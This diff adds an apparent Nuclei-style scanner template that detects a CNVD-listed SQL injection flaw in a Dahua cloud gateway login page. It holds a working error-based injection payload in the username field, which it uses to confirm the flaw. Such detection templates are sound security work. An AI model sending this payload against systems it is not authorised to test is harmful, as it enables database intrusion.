@@ -1,0 +1,38 @@
+id: poc-yaml-dahuatech-sqli-cnvd-2024-38747
+info:
+  name: 大华智能云网关注册管理平台 SQL注入漏洞(CNVD-2024-38747)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CNVD-2024-38747
+  description: |
+    This template identifies a SQL injection vulnerability in the 大华智能云网关注册管理平台 (CNVD-2024-38747).
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/index.php/User/doLogin"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      username=1')and+updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)--+&password=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error:"
+      - type: word
+        part: body
+        words:
+          - "{{substr(t2, 0, 31)}}"
+      - type: word
+        part: body
+        words:
+          - "SQL语句"
